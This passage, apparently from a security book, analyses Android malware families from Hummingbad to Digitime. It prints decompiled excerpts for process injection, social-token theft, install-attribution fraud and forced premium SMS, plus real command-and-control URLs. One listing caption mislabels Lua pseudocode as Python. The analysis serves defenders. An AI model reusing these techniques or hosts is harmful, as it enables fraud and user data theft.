<p class="noindent">In 2016 Check Point discovered Hummingbad, a complex preinstalled malware family from China with lots of dynamically downloaded functionality. Of particular interest, Hummingbad performed process injection using the Linux system call <code>ptrace</code>. A July report titled “From Hummingbad to Worse” describes the technical details of this.</p>&#13;
<p class="indent">In the sample <em>com.swiping.whale</em> (v262, 783a), the injection code appears in the Java package <em>com.ry.inject.JNI</em>. Two asset files, <em>assets/inject</em> and <em>assets/libhooker.so</em>, are involved in hooking Google Play. The <em>inject</em> file is a regular Linux executable that takes command line arguments to direct the hooking process. <a href="ch02.xhtml#ch2lis17">Listing 2-17</a> shows how Hummingbad builds the whole process injection command.</p>&#13;
<pre>String v2_0 = new StringBuilder().append(this.val$injectPath)&#13;
  .append(" ").append("com.android.vending").append(" ")&#13;
  .append(this.val$hookerPath).append(" hook_entry hahaha").toString();</pre>&#13;
<p class="list" id="ch2lis17"><em>Listing 2-17: Hummingbad starting the process injection into Google Play</em></p>&#13;
<p class="indent">The first argument is the name of the process to hook (<em>com.android.vending</em>, for Google Play) and the second is the binary to be injected, <em>libhooker.so</em>. The third argument is an exported function in <em>libhooker.so</em> that is called after the binary is injected into the Google Play process.</p>&#13;
<p class="indent">This binary also contains a Java code file that is responsible for interacting with Google Play after injection. This code allows Hummingbad to manipulate the Google Play interface to, for example, click the installation button and install apps without user consent.</p>&#13;
<h4 class="h4" id="ch02lev1sec26"><span epub:type="pagebreak" id="page_54"/><strong><em>YouTube Downloader</em></strong></h4>&#13;
<p class="noindent">YouTube Downloader was a comparatively small malware family preinstalled on low-cost Android devices. To distribute the malware, someone with access to the device manufacturing process inserted malicious code into Google apps like YouTube (hence the name of the malware family), effectively replacing the legitimate apps.</p>&#13;
<p class="indent">Injecting malware into preloaded Google apps makes it much harder for antivirus applications to disinfect devices. Due to technical limitations, it is impossible to delete preloaded apps from devices; we can only disable these apps to stop them from running. However, an attempt to disable popular apps like YouTube to protect users likely won’t succeed, as users will probably re-enable them to watch videos.</p>&#13;
<p class="indent">YouTube apps containing the preloaded malware also can’t be updated to the legitimate version. Original YouTube apps are signed with Google’s secret private key. When malware developers inject malicious code into the legitimate YouTube app, they need to re-sign the modified app to prove its integrity to Android. But, as malware developers don’t have Google’s private key, they must use their own. As a result, when installing a legitimate YouTube update, Android notices the key mismatch and denies the install, turning the code signing security feature against the user. In the end, the only way to disinfect devices with fake YouTube apps is for the manufacturer to issue a complete system update that removes the app.</p>&#13;
<p class="indent">YouTube Downloader set the direction for the next few years of malware. Many malware developers stopped developing new preinstalled malware apps and instead focused on injecting malicious code into legitimate system apps. Over time, the locations of the code became ever more sneaky. We’ve seen code injected into the system UI process, the update process, and even the Android API itself. Disabling these sensitive apps and files renders devices unusable, putting antivirus products in a difficult spot when they try to protect users.</p>&#13;
<p class="indent">Other than their distribution technique, YouTube Downloader files are not very interesting. Samples like <em>com.google.android.youtube</em> (v1599000099, 428a) contain nothing but functionality that downloads and installs other apps. We omit example code for these samples, as they do not contain any novel techniques.</p>&#13;
<h3 class="h3" id="ch02lev4"><strong>The Consolidation of Abuse: 2017 and Onward</strong></h3>&#13;
<p class="noindent">In 2017, Android malware developers reached consensus regarding the best ways to profit from Android malware. This change ended the diverse, exploratory phase of the prior years, when successful malware developers used many techniques to make money. From 2017 on, the largest malware families were proxy networks like Idle Coconut, WAP fraud families like the previously described Joker and Turkish Clicker, data brokers like OneAudience, and ad fraud families like Android.Click.312.origin. We’ll look at the last two of these in this section.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_55"/>While diverse at first glance, most modern malware follows a common scheme. First, it is invisible to users. Users don’t like abusive, malicious, or annoying app behavior. If they believe an app is problematic, they will uninstall it, ending the developer’s ability to earn income from it. Setting up network proxies, slurping up data, or clicking invisible ads is not behavior users can easily recognize or attribute to a particular app. Apps with this invisible functionality can stay on devices for months or years, running in the background even if users have long forgotten about them.</p>&#13;
<p class="indent">Second, modern malware requires very few Android permissions. To set up network proxies, generate fraudulent ad clicks, or connect to WAP fraud sites, they require only the <code>INTERNET</code> permission. Nearly every app in the Android ecosystem requests this permission, so malware authors can use it without garnering unwanted attention. The lack of sensitive or unusual permissions makes it very difficult for security companies to scan for and detect this kind of abuse. With no activity besides network requests, this malware is as indistinguishable from legitimate apps as it gets.</p>&#13;
<p class="indent">Third, modern malware sits in a legal and moral gray area. A malware author who steals a user’s bank credentials and empties their bank account will find themselves in the spotlight of law enforcement. But a malware author who pays app developers to embed a proxy SDK or collect user data is unlikely to be prosecuted. As a result, malware developers don’t have to be underground criminal organizations. Seemingly legitimate software shops with office buildings, social media presence, and venture capital funding can build these kinds of apps.</p>&#13;
<p class="indent">In addition, many successful modern Android malware families use SDKs. Advertising fraudsters, proxy networks, and data brokers make only a little money from each infected device, so they must reach large numbers of devices. To get there, these malware developers build SDKs and convince legitimate developers to use them in their apps, either voluntarily or for pay. In several publicly documented cases, malware SDKs were embedded in apps that had hundreds of millions of installs. No other known method allows malware developers to scale to this level.</p>&#13;
<p class="indent">Convincing legitimate developers to embed SDKs in their apps without asking too many questions requires at least the appearance of legitimacy, which explains why many malware companies have pretended to be legitimate participants in the Android ecosystem. They have professional websites, a presence on LinkedIn, and even account managers on staff that build relationships with legitimate developers of popular apps.</p>&#13;
<p class="indent">The SDK method also pushes cost and risk away from malware developers and onto unwitting developers. Once a malware SDK is revealed, it’s the legitimate developer’s Google Play account that risks being terminated. The fraudsters behind the SDK hide their traces through shell companies in countries such as Seychelles. A shell company that has acquired a bad reputation is easily replaced by a new shell company run by the same people.</p>&#13;
<h4 class="h4" id="ch02lev1sec27"><span epub:type="pagebreak" id="page_56"/><strong><em>OneAudience</em></strong></h4>&#13;
<p class="noindent">Data brokers are as old as Android but grew in popularity around 2017, when more of them began building SDKs and paying legitimate developers to secretly embed them in their apps. These SDKs gather as much information about a user’s location history, app usage, or web browsing behavior as possible. Because there is no shortage of potential buyers for this data, many companies push the boundaries of what kinds of data collection Google Play policies will allow.</p>&#13;
<p class="indent">Founded in 2016, an American company called OneAudience was an early player in that space. Its stated goal was to “help developers earn new revenue by enhancing app user information into the audience insights advertisers crave.” In 2019, it was discovered that OneAudience provided an Android SDK that collected Twitter (which was renamed X in 2023) and Facebook information without user consent. After being exposed, the company swiftly announced its shutdown. Facebook later filed a lawsuit against the developer pertaining to the company’s data access practices. They settled the lawsuit, as described in Facebook’s February 2020 blog post “Taking Action Against Platform Abuse.” OneAudience acknowledged the settlement on its website but kept its product and company shut down.</p>&#13;
<p class="indent">The technical details of OneAudience’s access to Twitter and Facebook accounts reveal a security problem common across all popular operating systems. Modern applications are built by combining app code with many add-on SDKs. By default, all of this code is executed in the same process. There are no security boundaries inside a process, as the operating system assumes that all code inside the same process is equally trustworthy. Unfortunately, this model is outdated and unrealistic. Rogue SDKs exist, with full access to all of the app’s other SDKs and core code.</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2lis18">Listing 2-18</a>, taken from the app <em>com.bestcoolfungames.cockroachsmasher</em> (v10617, 52f2), shows how the OneAudience SDK uses reflection to access users’ Facebook and Twitter information. This behavior is possible because the Facebook and Twitter SDKs are running in the same app process as the OneAudience SDK. If a user has previously logged in to Twitter or Facebook from inside the app, the Twitter and Facebook SDKs contain their authentication tokens. OneAudience collects these authentication tokens and uses them to secretly connect to the user’s Twitter and Facebook accounts and scrape personal information.</p>&#13;
<pre>public static String getFacebookAccessToken() {&#13;
  Class[] v3_0 = new Class[0];&#13;
  try {&#13;
    Class v4_0 = Class.forName("com.facebook.AccessToken");&#13;
  } catch (Exception v0_2) {&#13;
    ...&#13;
  }&#13;
&#13;
  if (v4_0 == null) {&#13;
    Method v0_5 = null;&#13;
  <span epub:type="pagebreak" id="page_57"/>} else {&#13;
    v0_5 = v4_0.getDeclaredMethod("getCurrentAccessToken", v3_0);&#13;
  }&#13;
  ...&#13;
}&#13;
&#13;
public String getSocialProfileJSON() {&#13;
  String v0_0 = "";&#13;
  String v1_0 = com.oneaudience.sdk.c.a.getFacebookAccessToken();&#13;
    if (v1_0 != null) {&#13;
      com.oneaudience.sdk.c.a.b v0_4 = new com.oneaudience.sdk.b().send(&#13;
        new com.oneaudience.sdk.i().getFacebookProfile(&#13;
          this.context, this.oneaudienceSharedPreferences, v1_0));&#13;
      ...&#13;
    }&#13;
    Object v1_3 = com.oneaudience.sdk.c.h.talkToTwitter();&#13;
    if (v1_3 == null) {&#13;
      String v1_4 = "";&#13;
    } else {&#13;
      v1_4 = this.extractJson(v1_3);&#13;
    }&#13;
    ...&#13;
    return this.extractJson(&#13;
      new com.oneaudience.sdk.model.SocialData(v0_0, v1_4));&#13;
}</pre>&#13;
<p class="list" id="ch2lis18"><em>Listing 2-18: OneAudience uses reflection to access Twitter and Facebook authentication tokens.</em></p>&#13;
<p class="indent">Besides Twitter and Facebook information, OneAudience also collected information about the user’s email addresses, phone call history, contact list, location, installed apps, and much more.</p>&#13;
<h4 class="h4" id="ch02lev1sec28"><strong><em>Android.Click.312.origin</em></strong></h4>&#13;
<p class="noindent">In 2018, the Russian antivirus company Dr. Web discovered the largest click fraud family of that year. In the August 2019 blog post “Doctor Web: Clicker Trojan Installed from Google Play by Some 102,000,000 Android Users,” the company gave the malware family the nondescript name <em>Android.Click.312.origin</em>. This generic name understates the importance of this family, which remained prominent in 2019 and 2020.</p>&#13;
<p class="indent">Android.Click.312.origin is a typical click fraud SDK. It uses heavily obfuscated class and variable names and encrypts all of its strings with a custom encryption scheme. <a href="ch02.xhtml#ch2lis19">Listing 2-19</a> shows an excerpt taken from the app <em>com.happylife.callflash</em> (v26, dca4).</p>&#13;
<pre>static {&#13;
    com.graver.data.f.b.a = com.graver.data.f.c.a("XnhueSZKbG5lfw==");&#13;
    com.graver.data.f.b.b = com.graver.data.f.c.a("Q39/e0NqZW9nbnk=");&#13;
    <span epub:type="pagebreak" id="page_58"/>com.graver.data.f.c.a("Y39/e1luen5ueH8rYngrZX5nZyU=");&#13;
    com.graver.data.f.c.a("eW54fmd/K2J4K25me39y");&#13;
    com.graver.data.f.c.a("UH55ZzEueFYnUHlueH5nfzEueFY=");&#13;
    com.graver.data.f.c.a("eW56fm54f0dieH9uZW55K2J4K2V+Z2cneW54fmd/MS54J1B+eWdWMS54");&#13;
    ...</pre>&#13;
<p class="list" id="ch2lis19"><em>Listing 2-19: Using name obfuscation and custom string encryption, Android.Click.312.origin protects itself from naive analysis.</em></p>&#13;
<p class="indent">Under all of this obfuscation and encryption, Android.Click.312.origin is straightforward. After a certain period of time, the SDK starts creating invisible WebView objects and executes JavaScript code that fraudulently clicks advertisements.</p>&#13;
<h4 class="h4" id="ch02lev1sec29"><strong><em>Cheetah Mobile</em></strong></h4>&#13;
<p class="noindent">In November 2018, BuzzFeed News published an article called “These Hugely Popular Android Apps Have Been Committing Ad Fraud Behind Users’ Backs” about a severe form of ad fraud discovered by US-based advertising company Kochava. The article accused Chinese mobile app development company Cheetah Mobile of defrauding legitimate advertisers through a technique called <em>installation attribution fraud</em>. After the BuzzFeed News article broke, Cheetah Mobile was permanently suspended from Google Play.</p>&#13;
<p class="indent">Installation attribution fraud is a form of ad fraud that doesn’t rely on fraudulent clicks on ads to make money. Instead, it intercepts the installation attribution process, which determines the advertiser to credit when a user installs an app from an ad. When no fraud is involved, the developer of the application that showed the ad is credited for the installation of the advertised app. But when fraud is involved, this crediting system can be redirected: the fraudulent code intercepts the attribution, replacing it with a forged attribution that claims that the installation came from the fraudster’s code. Then, the fraudster receives the credit instead of the developer of the legitimate app that showed the ad.</p>&#13;
<p class="indent">Responding to the allegations by BuzzFeed News and Kochava, Cheetah Mobile representatives posted a series of nine blog posts explaining their point of view. Denying responsibility for the fraudulent behavior, Cheetah Mobile blamed several SDKs embedded in its apps for the fraudulent behavior—most notably three SDKs called Batmobi, Duapps, and Altamob, which were themselves developed by three Chinese companies in the mobile advertising space.</p>&#13;
<p class="indent">Who is to blame for the fraud (and whether any of the lawsuits with which the different parties threatened each other actually materialized) is beyond the scope of this book, but let’s take a look at how the fraud works. In order to perform installation attribution fraud, the SDKs continuously monitor installations coming from Google Play. After a few plausibility checks to hide the fraudulent activity, they broadcast a <code>com.android.vending.INSTALL_REFERRER</code> message to claim themselves as the source of the new app installation. <a href="ch02.xhtml#ch2lis20">Listing 2-20</a> shows this straightforward fraud technique.<span epub:type="pagebreak" id="page_59"/></p>&#13;
<pre>while ((System.currentTimeMillis() - this.j) &lt; this.h) { &#13;
  Intent v0_5 = new Intent("com.android.vending.INSTALL_REFERRER");&#13;
  v0_5.setPackage(this.e);&#13;
  v0_5.setFlags(32);&#13;
  v0_5.putExtra("referrer", this.refData);&#13;
  this.ctx.sendBroadcast(v0_5);&#13;
  Thread.sleep(this.i);&#13;
}</pre>&#13;
<p class="list" id="ch2lis20"><em>Listing 2-20: The SDK sends an install referrer message to fraudulently claim to be the origin of an app installation.</em></p>&#13;
<p class="indent">Of course, the SDKs implicated in this case are not the only ones practicing installation attribution fraud. Like click fraud, this method is widespread in the Android ecosystem. Ad providers would be well advised to study it and take steps to protect their own advertisement revenue streams.</p>&#13;
<h4 class="h4" id="ch02lev1sec30"><strong><em>Anti-Fraud SDKs</em></strong></h4>&#13;
<p class="noindent">In 2019, another problematic kind of SDK rose to prominence: financial anti-fraud SDKs. Embedded in financial apps (usually those for personal loans), these SDKs determine whether a user is a legitimate person. At first glance, this practice seems perfectly reasonable for protecting customers. The problem is that these SDKs collect so much data from devices that they cross into spyware territory. For example, the biggest such SDK, dubbed Loan Spy by the Android Security team, abuses the accessibility API to get access to WhatsApp messages, then guesses whether the user is legitimate based on their WhatsApp usage.</p>&#13;
<p class="indent">Little is publicly known about these SDKs, but in October 2019 the Chinese news website China Money Network reported that authorities had raided the offices of technology company Tongdun in connection with one such scheme. The article “China Cracks Down on Malicious Lending and Web Crawlers, Temasek-Backed Tongdun Tech Implicated” reads:</p>&#13;
<div class="bq">&#13;
<p class="noindent">As part of this nation-wide campaign, law enforcement agencies have also targeted rampant illegal scraping of personal data online. It is an industry open secret that the practice of illegally collecting and selling personal data is an “original sin” that few of the so-called big data companies can escape.</p>&#13;
</div>&#13;
<p class="indent">Like its competitors, Loan Spy accesses a veritable laundry list of sensitive information on the user’s device: call log information, SMS messages, contact lists, GPS location data, and so on. Most troubling, though, is that Loan Spy also abuses the accessibility API to break the sandbox between Android apps. This API includes support tools like screen readers, input simulation, and other features that ignore the sandbox between applications in order to fully interact with all apps on the system.</p>&#13;
<p class="indent">You might be wondering how these SDKs can become widespread if they only target apps from financial institutions. The answer is that in <span epub:type="pagebreak" id="page_60"/>Southeast Asia, the financial lending situation looks stunningly different from that of the Western world. In the years leading up to 2020, demand for personal lines of credit vastly increased, leading to the creation and publication of more than 10,000 small personal lending apps targeting users in that region. These apps all need methods of determining whether they are loaning money to fake personas, in which case there would be little chance of recovering the loans later on. Thus, Loan Spy has garnered a presence on Android devices that rivals that of intentionally fraudulent malware networks.</p>&#13;
<p class="indent">In the years leading up to 2023, another problem with these personal loan apps was widely reported by app users. Using the personal data previously collected from devices, loan companies would call and threaten people who were behind on their loans, or even their friends or family members. The Google Play policy team responded in April 2023 by disallowing personal loan applications from requesting Android permissions related to personal information such as contact lists, phone numbers, photos, or location. Going forward, personal loan applications will not be able to use these permissions for any reason.</p>&#13;
<h4 class="h4" id="ch02lev1sec31"><strong><em>Loapi/Podec</em></strong></h4>&#13;
<p class="noindent">Two of the largest malware families found outside of Google Play from 2017 on were Loapi/Podec and HDC Bookmark. Of these, the Loapi/Podec family is the more interesting one. Russian security company Kaspersky first described Podec in a March 2015 blog post titled “SMS Trojan Bypasses CAPTCHA.” A December 2017 follow-up blog post titled “Jack of All Trades” linked a newer variant, called Loapi, to Podec.</p>&#13;
<p class="indent">Loapi/Podec may have started as simple SMS fraud malware, but over time it grew into a powerful backdoor trojan. According to Kaspersky, the 2015 version (Podec) handled 16 different commands from its command-and-control servers. While most were related to premium billing sign-ups or general SMS or phone call abuse, one noteworthy command told infected devices to execute a DDoS attack against a provided target.</p>&#13;
<p class="indent">The 2017 variant (Loapi) expanded on Podec’s capabilities with a complex plug-in-based system that could download and execute additional malicious modules, depending on instructions from the command-and-control server. In particular, Kaspersky calls out the trojan’s ability to perform advertising fraud, Monero cryptocurrency mining, and many more activities.</p>&#13;
<h4 class="h4" id="ch02lev1sec32"><span epub:type="pagebreak" id="page_61"/><strong><em>HDC Bookmark</em></strong></h4>&#13;
<p class="noindent">The second major sideloaded family of this period, HDC Bookmark, proved less sophisticated. Its author bulk-created many thousands of apps with package names that started with <em>com.hdc.bookmark</em> and ended with a random number, such as <em>com.hdc.bookmark52428</em> (v1, 1dda). Targeting Vietnam, these apps appear to be associated with <em>apkfull.mobi</em>, a Vietnamese site that existed from 2013 to 2018 and provided cracked versions of Android apps and games. The HDC Bookmark apps offered these for download for a small fee of roughly $0.65.</p>&#13;
<p class="indent">Though it was likely profitable at first, we don’t believe this malware family found long-term success. These apps do not defend against detection, and most common Android anti-malware products reliably detect them. The Android operating system now also protects the sign-up process for SMS-based subscription services by showing a warning to users that apps are trying to send costly messages. This might explain why the <em>apkfull.mobi</em> website disappeared in 2018.</p>&#13;
<p class="indent">However, HDC Bookmark apps have an insidious feature that lets them send premium texts even if the user explicitly disagrees. Encrypted asset files, such as <em>assets/map.lib</em>, include configuration options in JSON format. When the <code>url_config_auto_sms</code> option is set, the app sends a premium SMS regardless of whether the user wants to pay 15,000 Vietnamese Dong for a pirated app. In <a href="ch02.xhtml#ch2lis21">Listing 2-21</a>, you can see the click handler for this subscription dialog’s Cancel button.</p>&#13;
<pre>public void onClick(DialogInterface dialog, int which) {&#13;
  try {&#13;
    this.this$0.auto_sms = DownloadImage.instance.getAuto_sms2(&#13;
      com.hdc.service.Service_mLink.url_config_auto_sms);&#13;
  } catch (Exception v0) {&#13;
    this.this$0.auto_sms = "0";&#13;
  }&#13;
  if (!this.this$0.auto_sms.equals("1")) {&#13;
    dialog.dismiss();&#13;
    if (!Service_mLink.link_redirect.equals("")) {&#13;
      com.hdc.bookmark52428.MainActivity.access$3(&#13;
        this.this$0, Service_mLink.link_redirect);&#13;
    }&#13;
    System.exit(1);&#13;
  } else {&#13;
    if ((this.this$0.typeNetwork != "VIETNAM_MOBILE") &#13;
      &amp;&amp; (this.this$0.typeNetwork != "BEELINE")) {&#13;
      com.hdc.ultilities.SendSMS.send(&#13;
        com.hdc.service.Service_mLink.mo_Active,&#13;
        com.hdc.service.Service_mLink.svcodeActive,&#13;
        this.this$0, this.this$0.type_so);&#13;
    } else {&#13;
      com.hdc.ultilities.SendSMS.send(&#13;
      com.hdc.service.Service_mLink.mo_Active,&#13;
      com.hdc.service.Service_mLink.svcodeActive2,&#13;
      this.this$0, this.this$0.type_so);&#13;
    }&#13;
    ...&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch2lis21"><span epub:type="pagebreak" id="page_62"/><em>Listing 2-21: Regardless of user choice,</em> com.hdc.bookmark52428 <em>(v1, 1dda) can be configured to always send premium SMS messages.</em></p>&#13;
<p class="indent">If <code>auto_sms</code> is disabled, the app exits after the user declines the offer. However, if <code>auto_sms</code> is enabled, the app checks what Vietnamese mobile carrier the device is using and sends the premium SMS. This behavior is fraudulent.</p>&#13;
<h4 class="h4" id="ch02lev1sec33"><strong><em>EagerFonts</em></strong></h4>&#13;
<p class="noindent">Preinstalled malware continues to thrive on low-cost and no-name devices. Deep inside new Android phones, researchers have discovered business models built on spyware, unwanted advertising, and pay-for-install app-pushing schemes.</p>&#13;
<p class="indent">One particularly nasty preinstalled malware family was EagerFonts, a trojan disguised as a font management app that downloaded malicious modules in the background. The EagerFonts developers convinced a chipset vendor to include the app in its development SDK. As a result, all manufacturers using that chipset SDK had their devices infected. In total, EagerFonts compromised more than 12 million devices across more than 1,000 models built by hundreds of manufacturers.</p>&#13;
<p class="indent">EagerFonts highlights a simple truth in supply chain compromise: the further upstream a compromise happens, the larger the number of infected devices. Convincing a single manufacturer to include malware on devices is profitable, but convincing the supplier of more than 100 manufacturers to do so is like winning the lottery. Even if the abuse is detected, any malware removal effort will take months of coordination between vendors and likely miss a significant fraction of infected devices. In the meantime, the malware will continue to bring in money for its developers.</p>&#13;
<p class="indent">The Android Security team described this malware’s technical details in a BlackHat USA 2019 talk, “Securing the System—A Deep Dive into Reversing Android Pre-Installed Apps.” The slides for this talk are freely available on the internet. Like most preinstalled backdoors, the main purpose of EagerFonts is to download plug-ins with malicious functionality. It connects to a command-and-control server at <em>pushstablev9.ekesoo.com</em>, as shown in <a href="ch02.xhtml#ch2lis22">Listing 2-22</a>. This domain primarily hosts a pornography site.</p>&#13;
<pre>public void run() {&#13;
  ArrayList v0_1 = new ArrayList();&#13;
  v0_1.add(new BasicNameValuePair("installationid",&#13;
    com.iekie.lovelyfonts.fonts.d.b.c(this.c)));&#13;
  <span epub:type="pagebreak" id="page_63"/>v0_1.add(new BasicNameValuePair("channel", &#13;
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).d()));&#13;
  v0_1.add(new BasicNameValuePair("msgid", this.a));&#13;
  v0_1.add(new BasicNameValuePair("msg_type", this.b));&#13;
  v0_1.add(new BasicNameValuePair("type", &#13;
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).e()));&#13;
  v0_1.add(new BasicNameValuePair("appversion", &#13;
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).m()));&#13;
  v0_1.add(new BasicNameValuePair("status", "0"));&#13;
  try {&#13;
    new com.iekie.lovelyfonts.fonts.d.a(&#13;
      "http://pushstablev9.ekesoo.com/cloudfontapp/upgrademsgopen",&#13;
      v0_1).a(0);&#13;
  } catch (IOException v0_3) {&#13;
    v0_3.printStackTrace();&#13;
  }&#13;
  return;&#13;
}</pre>&#13;
<p class="list" id="ch2lis22"><em>Listing 2-22: EagerFonts communicates with its command-and-control server.</em></p>&#13;
<p class="indent">Besides code for downloading and managing the malicious plug-ins, EagerFonts contains little other functionality. The downloaded plug-ins are highly diverse and belong to Chinese malware families like Chamois and Snowfox (discussed earlier in this chapter).</p>&#13;
<h4 class="h4" id="ch02lev1sec34"><strong><em>GMobi</em></strong></h4>&#13;
<p class="noindent">Malware developers have repeatedly attacked one particular part of the preinstalled app supply chain: third-party over-the-air (OTA) update providers. OTA update software downloads and installs system updates onto Android devices, be it smaller monthly security updates or new versions of Android. Installing these updates requires OTA software to make changes deep inside the Android system, so it has some of the highest privileges available. This highly privileged position makes it a prime target for Android malware developers.</p>&#13;
<p class="indent">Manufacturers manage and distribute updates to their devices using several strategies. Large companies, like Samsung and Xiaomi, manage their own OTA update infrastructure and software. Google provides GOTA, a free OTA distribution and management solution for devices with Google Play Services. Manufacturers who cannot or do not want to use GOTA can pick from about a dozen commercial OTA solution providers. After a series of security problems, researchers started investigating these commercial OTA providers.</p>&#13;
<p class="indent">The first of these OTA providers that we’ll consider is by the Taipei-based General Mobile Corporation (GMobi). Concerns about GMobi’s OTA app first came to light when Russian security company Dr. Web published a blog post called “New Adware for Android Attacked Firmware and Apps by Well-Known Companies” in March 2016. Dr. Web researchers noted <span epub:type="pagebreak" id="page_64"/>capabilities like data collection (for example, collecting the user’s email addresses and GPS location), showing unwanted ads, and installing new apps without user consent. In particular, the ability to install apps led to malware incidents: for example, in October 2015, GMobi installed a Ghost Push app on nearly a million devices.</p>&#13;
<p class="indent">Months earlier, in January 2015, a Tech in Asia article described GMobi’s business model. The article, titled “Meet the Company Stamping Bloatware on Millions of Emerging Market Smartphones,” said the following:</p>&#13;
<div class="bq">&#13;
<p class="bq">It’s important to remember that behind every piece of bloatware is a hard-won handshake. By mutually agreeing to invade your smartphone, app publishers get reach, and smartphone brands get cash. GMobi is a Taiwan-based startup that earns money by facilitating these handshakes. For four years, the company has brokered pre-installs, built white-label app stores, and driven firmware updates for dozens of smartphone brands.</p>&#13;
</div>&#13;
<p class="indent">Other commercial OTA providers likely receive pay for installing apps and displaying ads, driving their profits. The OTA functionality is only a means to establish a deep hook into the Android system.</p>&#13;
<p class="indent">Additional security companies also took note of GMobi. German antivirus company Avira described adware problems with GMobi in an April 2016 blog post, “Trojan Adware Hits Budget Androids—And Some Well-Known Apps.” In July 2018, a <em>Washington Post</em> article called “App Traps: How Cheap Smartphones Siphon User Data in Developing Countries” used research by the British company Upstream Systems to further scrutinize GMobi’s data collection practices.</p>&#13;
<h4 class="h4" id="ch02lev1sec35"><strong><em>Adups</em></strong></h4>&#13;
<p class="noindent">Another OTA provider company with a documented history of security concerns is Shanghai-based Adups. In October 2016, the security company Kryptowire exposed spyware behavior in the Adups OTA software. Its report, titled “Android Firmware Sharing Private Data Without Consent,” notes that the Adups software collects text messages, contact list information, and the device’s call history, including full telephone numbers.</p>&#13;
<p class="indent">Like GMobi, Adups software can download and install other applications without user consent. The first public evidence of this functionality dates back to at least January 2015, when a Reddit user posted the following in the <em>/r/india</em> subreddit:</p>&#13;
<div class="bq">&#13;
<p class="noindent">I use a Micromax A093 Canvas fire, and have been since August of last year. [ . . . ] Meanwhile, looks like Micromax is installing apps without my permission, using up precious space and my 3G! Apps reappear after uninstalling them. This is ridiculous! Many times, instead of downloading apps, it creates 8-10 notifications which are advertisements for online stores and other apps.</p>&#13;
</div>&#13;
<p class="indent">Adups continued to build these capabilities and downloaded and installed apps that made up large Chinese botnets like Ghost Push and <span epub:type="pagebreak" id="page_65"/>Snowfox. Certain iterations of Adups have drawn so much attention from security researchers that The MITRE Corporation, a US-based defense nonprofit, now lists it in its MITRE ATT&amp;CK framework, an industry-standard repository of malware tactics and techniques.</p>&#13;
<h4 class="h4" id="ch02lev1sec36"><strong><em>Redstone</em></strong></h4>&#13;
<p class="noindent">A third OTA company with a history of security problems is Redstone Sunshine, based in Beijing. In April 2021, Malwarebytes, a US-based anti-malware company, expressed concerns about Redstone in an article called “Pre-Installed Auto Installer Threat Found on Android Mobile Devices in Germany.” This article made quite a splash in the tech press. For example, the largest German computer magazine, <em>Computer Bild</em>, picked up the story, and the German Bundesamt für Sicherheit in der Informationstechnik (Federal Office for Information Security) issued a warning to German users of the affected devices.</p>&#13;
<p class="indent">In November 2021, Dr. Web described a series of data collection problems and hidden app installs affecting the Elari Kidphone 4G Smartwatch. A blog post titled “Doctor Web Discovered Vulnerabilities in Children’s Smart Watches” describes how the OTA component could be used for “cyber espionage, displaying ads, and installing unwanted or even malicious apps.” Dr. Web does not mention Redstone in the text, but many of the malicious files presented in the blog post belong to Redstone’s OTA solution. This can be verified by looking at the app signing information of the presented files.</p>&#13;
<h4 class="h4" id="ch02lev1sec37"><strong><em>Digitime</em></strong></h4>&#13;
<p class="noindent">Digitime, a company from Shenzhen, China, went unnoticed by the professional security world and tech press until 2019. That year, an independent security researcher nicknamed Ninji documented problems with Digitime’s OTA update software functionality. In the December blog post “Researching the Digitime Tech FOTA Backdoors,” Ninji describes Digitime’s extensive Lua-based plug-in system, which downloads additional modules with problematic functionality. Examples include the ability to install and uninstall any apps on the device and grant them any permissions without using the permission prompt.</p>&#13;
<p class="indent">Half a year later, Digitime’s OTA update software caused public concern. Malwarebytes identified security and privacy problems with a low-cost device named UMX U683CL that was built by Chinese company TeleEpoch, branded for Chinese device manufacturer Unimax, and sold by the American mobile carrier Assurance Wireless. Despite involving lesser-known manufacturers, this device model is noteworthy. It was part of Lifeline, a federal program to lower the monthly cost of phone and internet service for eligible US citizens. The revelation that this Chinese-built device had backdoor and spyware capabilities caused an uproar in the national press, though Digitime temporarily escaped unscathed; Malwarebytes mistakenly attributed the OTA software to Adups instead. Then, in July 2020, an anonymous contributor going by the name Concerned_Citizen posted a forum thread in <span epub:type="pagebreak" id="page_66"/>the public Malwarebytes forums called “Pre-Installed Malware on Lifeline Phones” explaining how they had applied Ninji’s reverse engineering guide to the software’s Lua code and discovered that the real company behind the app was Digitime.</p>&#13;
<p class="indent">Over time, Digitime built an increasingly sophisticated obfuscation and encryption scheme to hide its Lua-based plug-in engine. Recent versions like <em>com.qiot.update</em> (v1032, 4529) were first seen in September 2019 and installed on devices like the Oukitel C22 and the Okapi 10 Pro. On these devices, Digitime modifies the Android system component <em>frameworks.jar</em> file by adding nonstandard packages named <em>com.internal.jar.pl.*</em>. Code in these packages calls out to a native ELF library at <em>/system/lib64/libpowerhalwrap_jni.so</em>. After passing all kinds of anti-analysis checks, the ELF library drops two DEX files and a ZIP file that contains a standard Lua framework.</p>&#13;
<p class="indent">The Lua interpreter is statically linked into the ELF library, with one cheeky modification: the <code>luaL_loadfile</code> method, responsible for loading Lua scripts, is modified to load nonstandard Lua files encrypted with a simple XOR algorithm. Thus, after extracting the Lua scripts, analysts must decrypt them before loading them into Lua reverse engineering tools like LuaDec. Luckily, the encryption algorithm is simple. The modified <em>luaL_loadfile</em> method uses an XOR pad that can be created with the Python code in <a href="ch02.xhtml#ch2lis23">Listing 2-23</a>.</p>&#13;
<pre>function create_key:&#13;
  output = [0x00 .. 0xff];&#13;
  a = 1; b = 1;&#13;
  for i = 1 to 500:&#13;
    a = (a + b) &amp; 0xff;&#13;
    b = (a + b) &amp; 0xff;&#13;
    swap(output[a], output[b]);&#13;
  return output;</pre>&#13;
<p class="list" id="ch2lis23"><em>Listing 2-23: Python code for decrypting Digitime’s encrypted Python scripts</em></p>&#13;
<p class="indent">If the Lua scripts execute successfully, they will communicate with the command-and-control server at <em>http://rp1.androidevlog.com:10000/inf_v20</em> to receive configuration options and download more Lua modules. They download malicious plug-ins from domains like <em>google-global.com</em>, <em>facebook -3rd.com</em>, <em>bugreportsync.com</em>, <em>flurrydata.com</em>, and <em>gmscenter.org</em>, which impersonate legitimate companies in the Android ecosystem and were likely picked to fool security researchers reading logfiles or source code.</p>&#13;
